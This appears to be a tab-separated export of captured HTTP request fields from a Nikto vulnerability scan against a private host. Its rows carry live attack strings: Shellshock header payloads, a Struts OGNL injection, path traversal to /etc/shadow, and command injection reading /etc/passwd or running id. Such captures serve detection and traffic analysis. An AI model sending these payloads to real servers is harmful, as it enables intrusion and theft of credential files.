http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									3563					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/status
																	Keep-Alive										192.168.1.101									3569					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/sysinfo.pl
																	Keep-Alive										192.168.1.101									3577					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test
																	Keep-Alive										192.168.1.101									3584					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi
																	Keep-Alive										192.168.1.101									3592					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi
																	Keep-Alive										192.168.1.101									3598					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.php
																	Keep-Alive										192.168.1.101									3604					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.cgi.php
																	Keep-Alive										192.168.1.101									3611					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test_cgi.pl
																	Keep-Alive										192.168.1.101									3619					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test-cgi.pl
																	Keep-Alive										192.168.1.101									3626					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.py
																	Keep-Alive										192.168.1.101									3634					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/test.sh
																	Keep-Alive										192.168.1.101									3640					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/tmUnblock.cgi
																	Keep-Alive										192.168.1.101									3647					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/uname.cgi
																	Keep-Alive										192.168.1.101									3654					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/viewcvs.cgi
																	Keep-Alive										192.168.1.101									3662					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/welcome
																	Keep-Alive										192.168.1.101									3670					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/whois.cgi
																	Keep-Alive										192.168.1.101									3676					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/
																	Keep-Alive										192.168.1.101									3683						1	http://192.168.1.101/web/../../../../../../../../../../../../etc/shadow		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:dishwasher)				/web/../../../../../../../../../../../../etc/shadow
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101															1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									3693						1	http://192.168.1.101/web/index.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/index.action
																	Keep-Alive				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Nikto-Added-CVE-2017-5638',7*6)}.multipart/form-data						192.168.1.101									3702						1	http://192.168.1.101/web/login.action		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:strutshock)				/web/login.action
																	Keep-Alive										192.168.1.101									3711						1	http://192.168.1.101/web/cfappman/index.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000013)				/web/cfappman/index.cfm
																	Keep-Alive										192.168.1.101									3719						1	http://192.168.1.101/web/cfdocs/examples/cvbeans/beaninfo.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000014)				/web/cfdocs/examples/cvbeans/beaninfo.cfm
																	Keep-Alive										192.168.1.101									3726						1	http://192.168.1.101/web/cfdocs/examples/parks/detail.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000015)				/web/cfdocs/examples/parks/detail.cfm
																	Keep-Alive										192.168.1.101									3733						1	http://192.168.1.101/web/kboard/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000016)				/web/kboard/
																	Keep-Alive										192.168.1.101									3740						1	http://192.168.1.101/web/lists/admin/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000017)				/web/lists/admin/
																	Keep-Alive										192.168.1.101									3748						1	http://192.168.1.101/web/splashAdmin.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000018)				/web/splashAdmin.php
																	Keep-Alive										192.168.1.101									3756						1	http://192.168.1.101/web/ssdefs/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000019)				/web/ssdefs/
																	Keep-Alive										192.168.1.101									3763						1	http://192.168.1.101/web/sshome/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000020)				/web/sshome/
																	Keep-Alive										192.168.1.101									3770						1	http://192.168.1.101/web/tiki/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000021)				/web/tiki/
																	Keep-Alive										192.168.1.101									3777						1	http://192.168.1.101/web/tiki/tiki-install.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000022)				/web/tiki/tiki-install.php
																	Keep-Alive										192.168.1.101									3784						1	http://192.168.1.101/web/scripts/samples/details.idc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000023)				/web/scripts/samples/details.idc
																	Keep-Alive										192.168.1.101									3790						1	http://192.168.1.101/web/forumdisplay.php?GLOBALS\[\]=1&f=2&comma=\".system\('id'\)\.\"		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000070)				/web/forumdisplay.php?GLOBALS\[\]=1&f=2&comma=\".system\('id'\)\.\"
																	Keep-Alive										192.168.1.101									3796						1	http://192.168.1.101/web/guestbook/guestbook.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000071)				/web/guestbook/guestbook.html
																	Keep-Alive										192.168.1.101									3803						1	http://192.168.1.101/web/html/cgi-bin/cgicso?query=AAA		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000072)				/web/html/cgi-bin/cgicso?query=AAA
																	Keep-Alive										192.168.1.101									3809						1	http://192.168.1.101/web/bb-dnbd/faxsurvey		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000142)				/web/bb-dnbd/faxsurvey
																	Keep-Alive										192.168.1.101									3817						1	http://192.168.1.101/web/cartcart.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000143)				/web/cartcart.cgi
																	Keep-Alive										192.168.1.101									3825						1	http://192.168.1.101/web/scripts/Carello/Carello.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000144)				/web/scripts/Carello/Carello.dll
																	Keep-Alive										192.168.1.101									3832						1	http://192.168.1.101/web/w-agora/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000183)				/web/w-agora/
																	Keep-Alive										192.168.1.101									3840						1	http://192.168.1.101/web/cgi-local/cgiemail-1.6/cgicso?query=AAA		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000344)				/web/cgi-local/cgiemail-1.6/cgicso?query=AAA
																	Keep-Alive										192.168.1.101									3847						1	http://192.168.1.101/web/servlet/SchedulerTransfer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000345)				/web/servlet/SchedulerTransfer
																	Keep-Alive										192.168.1.101									3853						1	http://192.168.1.101/web/servlet/sunexamples.BBoardServlet		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000346)				/web/servlet/sunexamples.BBoardServlet
																	Keep-Alive										192.168.1.101									3859						1	http://192.168.1.101/web/servlets/SchedulerTransfer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000347)				/web/servlets/SchedulerTransfer
																	Keep-Alive										192.168.1.101									3865						1	http://192.168.1.101/web/perl/-e%20print%20Hello		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000352)				/web/perl/-e%20print%20Hello
																	Keep-Alive										192.168.1.101									3871						1	http://192.168.1.101/web/c/winnt/system32/cmd.exe?/c+dir+/OG		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000491)				/web/c/winnt/system32/cmd.exe?/c+dir+/OG
																	Keep-Alive										192.168.1.101									3878						1	http://192.168.1.101/web/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000494)				/web/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
																	Keep-Alive										192.168.1.101									3885						1	http://192.168.1.101/web/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000495)				/web/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
																	Keep-Alive										192.168.1.101									3892						1	http://192.168.1.101/web/msadc/samples/adctest.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000496)				/web/msadc/samples/adctest.asp
																	Keep-Alive										192.168.1.101									3899						1	http://192.168.1.101/web/athenareg.php?pass=%20;cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000667)				/web/athenareg.php?pass=%20;cat%20/etc/passwd
																	Keep-Alive										192.168.1.101									3906						1	http://192.168.1.101/web/cd-cgi/sscd_suncourier.pl		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001067)				/web/cd-cgi/sscd_suncourier.pl
																	Keep-Alive										192.168.1.101									3913						1	http://192.168.1.101/web/cgi-bin/handler		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001069)				/web/cgi-bin/handler
																	Keep-Alive										192.168.1.101									3920						1	http://192.168.1.101/web/cgi-bin/handler/netsonar;cat		GET				/etc/passwd|?data=Download HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001070)				/web/cgi-bin/handler/netsonar;cat
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/cgi-bin/webdist.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001071)				/web/cgi-bin/webdist.cgi
																	Keep-Alive										192.168.1.101									3932						1	http://192.168.1.101/web/DB4Web/10.10.10.10:100		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001072)				/web/DB4Web/10.10.10.10:100
																	Keep-Alive										192.168.1.101									3943						1	http://192.168.1.101/web/ews/ews/architext_query.pl		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001073)				/web/ews/ews/architext_query.pl
																	Keep-Alive										192.168.1.101									3950						1	http://192.168.1.101/web/exec/show/config/cr		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001074)				/web/exec/show/config/cr
																	Keep-Alive										192.168.1.101									3959						1	http://192.168.1.101/web/instantwebmail/message.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001075)				/web/instantwebmail/message.php
																	Keep-Alive										192.168.1.101									3966						1	http://192.168.1.101/web/cfdocs/snippets/gettempdirectory.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001076)				/web/cfdocs/snippets/gettempdirectory.cfm
																	Keep-Alive										192.168.1.101									3975						1	http://192.168.1.101/web/dostuff.php?action=modify_user		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001091)				/web/dostuff.php?action=modify_user
																	Keep-Alive										192.168.1.101									3981						1	http://192.168.1.101/web/logjam/showhits.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001157)				/web/logjam/showhits.php
																	Keep-Alive										192.168.1.101									3987						1	http://192.168.1.101/web/manual.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001158)				/web/manual.php
																	Keep-Alive										192.168.1.101									3994						1	http://192.168.1.101/web/mods/apage/apage.cgi?f=file.htm.|id|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001159)				/web/mods/apage/apage.cgi?f=file.htm.|id|
																	Keep-Alive										192.168.1.101									4001						1	http://192.168.1.101/web/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001160)				/web/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
																	Keep-Alive										192.168.1.101									4008						1	http://192.168.1.101/web/nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001161)				/web/nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
																	Keep-Alive										192.168.1.101									4016						1	http://192.168.1.101/web/perl/-e%20%22system('cat%20/etc/passwd');\%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001162)				/web/perl/-e%20%22system('cat%20/etc/passwd');\%22
																	Keep-Alive										192.168.1.101									4023						1	http://192.168.1.101/web/phpnuke/html/.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001163)				/web/phpnuke/html/.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
																	Keep-Alive										192.168.1.101									4024						1	http://192.168.1.101/web/phpnuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001164)				/web/phpnuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
																	Keep-Alive										192.168.1.101									4030						1	http://192.168.1.101/web/Program%20Files/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001165)				/web/Program%20Files/
																	Keep-Alive										192.168.1.101									4037						1	http://192.168.1.101/web/smssend.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001166)				/web/smssend.php
																	Keep-Alive										192.168.1.101									4043						1	http://192.168.1.101/web/pls/simpledad/admin_/dadentries.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001167)				/web/pls/simpledad/admin_/dadentries.htm
																	Keep-Alive										192.168.1.101									4049						1	http://192.168.1.101/web/level/16/exec/-///pwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001253)				/web/level/16/exec/-///pwd
																	Keep-Alive										192.168.1.101									4057						1	http://192.168.1.101/web/level/16/exec/-///show/configuration		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001254)				/web/level/16/exec/-///show/configuration
																	Keep-Alive										192.168.1.101									4058						1	http://192.168.1.101/web/level/16		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001255)				/web/level/16
																	Keep-Alive										192.168.1.101									4059						1	http://192.168.1.101/web/level/16/exec/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001256)				/web/level/16/exec/
																	Keep-Alive										192.168.1.101									4066						1	http://192.168.1.101/web/level/16/exec//show/access-lists		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001257)				/web/level/16/exec//show/access-lists
																	Keep-Alive										192.168.1.101									4073						1	http://192.168.1.101/web/level/16/level/16/exec//show/configuration		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001258)				/web/level/16/level/16/exec//show/configuration
																	Keep-Alive										192.168.1.101									4074						1	http://192.168.1.101/web/level/16/level/16/exec//show/interfaces		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001259)				/web/level/16/level/16/exec//show/interfaces
																	Keep-Alive										192.168.1.101									4075						1	http://192.168.1.101/web/level/16/level/16/exec//show/interfaces/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001260)				/web/level/16/level/16/exec//show/interfaces/status
																	Keep-Alive										192.168.1.101									4076						1	http://192.168.1.101/web/level/16/level/16/exec//show/version		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001261)				/web/level/16/level/16/exec//show/version
																	Keep-Alive										192.168.1.101									4077						1	http://192.168.1.101/web/level/16/level/16/exec//show/running-config/interface/FastEthernet		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001262)				/web/level/16/level/16/exec//show/running-config/interface/FastEthernet
																	Keep-Alive										192.168.1.101									4078						1	http://192.168.1.101/web/level/16/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001263)				/web/level/16/exec//show
																	Keep-Alive										192.168.1.101									4079						1	http://192.168.1.101/web/level/17/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001264)				/web/level/17/exec//show
																	Keep-Alive										192.168.1.101									4080						1	http://192.168.1.101/web/level/18/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001265)				/web/level/18/exec//show
																	Keep-Alive										192.168.1.101									4081						1	http://192.168.1.101/web/level/19/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001266)				/web/level/19/exec//show
																	Keep-Alive										192.168.1.101									4082						1	http://192.168.1.101/web/level/20/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001267)				/web/level/20/exec//show
																	Keep-Alive										192.168.1.101									4083						1	http://192.168.1.101/web/level/21/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001268)				/web/level/21/exec//show
																	Keep-Alive										192.168.1.101									4084						1	http://192.168.1.101/web/level/22/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001269)				/web/level/22/exec//show
																	Keep-Alive										192.168.1.101									4085						1	http://192.168.1.101/web/level/23/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001270)				/web/level/23/exec//show
																	Keep-Alive										192.168.1.101									4086						1	http://192.168.1.101/web/level/24/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001271)				/web/level/24/exec//show
																	Keep-Alive										192.168.1.101									4087						1	http://192.168.1.101/web/level/25/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001272)				/web/level/25/exec//show
																	Keep-Alive										192.168.1.101									4088						1	http://192.168.1.101/web/level/26/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001273)				/web/level/26/exec//show
																	Keep-Alive										192.168.1.101									4089						1	http://192.168.1.101/web/level/27/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001274)				/web/level/27/exec//show
																	Keep-Alive										192.168.1.101									4090						1	http://192.168.1.101/web/level/28/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001275)				/web/level/28/exec//show
																	Keep-Alive										192.168.1.101									4091						1	http://192.168.1.101/web/level/29/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001276)				/web/level/29/exec//show
																	Keep-Alive										192.168.1.101									4092						1	http://192.168.1.101/web/level/30/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001277)				/web/level/30/exec//show
																	Keep-Alive										192.168.1.101									4093						1	http://192.168.1.101/web/level/31/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001278)				/web/level/31/exec//show
																	Keep-Alive										192.168.1.101									4094						1	http://192.168.1.101/web/level/32/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001279)				/web/level/32/exec//show
																	Keep-Alive										192.168.1.101									4095						1	http://192.168.1.101/web/level/33/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001280)				/web/level/33/exec//show
																	Keep-Alive										192.168.1.101									4096						1	http://192.168.1.101/web/level/34/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001281)				/web/level/34/exec//show
																	Keep-Alive										192.168.1.101									4097						1	http://192.168.1.101/web/level/35/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001282)				/web/level/35/exec//show
																	Keep-Alive										192.168.1.101									4098						1	http://192.168.1.101/web/level/36/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001283)				/web/level/36/exec//show
																	Keep-Alive										192.168.1.101									4099						1	http://192.168.1.101/web/level/37/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001284)				/web/level/37/exec//show
																	Keep-Alive										192.168.1.101									4100						1	http://192.168.1.101/web/level/38/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001285)				/web/level/38/exec//show
																	Keep-Alive										192.168.1.101									4101						1	http://192.168.1.101/web/level/39/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001286)				/web/level/39/exec//show
																	Keep-Alive										192.168.1.101									4102						1	http://192.168.1.101/web/level/40/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001287)				/web/level/40/exec//show
																	Keep-Alive										192.168.1.101									4103						1	http://192.168.1.101/web/level/41/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001288)				/web/level/41/exec//show
																	Keep-Alive										192.168.1.101									4104						1	http://192.168.1.101/web/level/42/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001289)				/web/level/42/exec//show
																	Keep-Alive										192.168.1.101									4105						1	http://192.168.1.101/web/level/43/exec//show		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001290)				/web/level/43/exec//show
